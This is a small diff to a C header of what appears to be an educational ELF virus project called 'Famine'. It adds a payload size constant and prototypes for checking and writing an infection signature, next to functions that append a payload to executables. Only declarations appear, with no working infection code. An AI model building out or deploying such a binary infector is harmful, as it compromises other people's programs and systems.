@@ -15,6 +15,8 @@
 
 # define SIGNATURE "Famine version 1.0 (c)oded by ialgac-beeligul"
 # define SIGNATURE_SIZE 46
+# define PAYLOAD_SIZE 100
+
 
 typedef struct  s_file
 {
@@ -27,7 +29,8 @@ typedef struct  s_file
 
 Elf64_Phdr  *last_phdr(char *data);
 uint64_t    payload(char *data, size_t data_size, char *code, size_t code_size);
-int         is_signed(char *data, size_t size);
+int         is_signed(t_file file);
+int         sign(t_file target);
 
 t_file      file_load(char *path, size_t append_size);
 int         file_unload(t_file file);
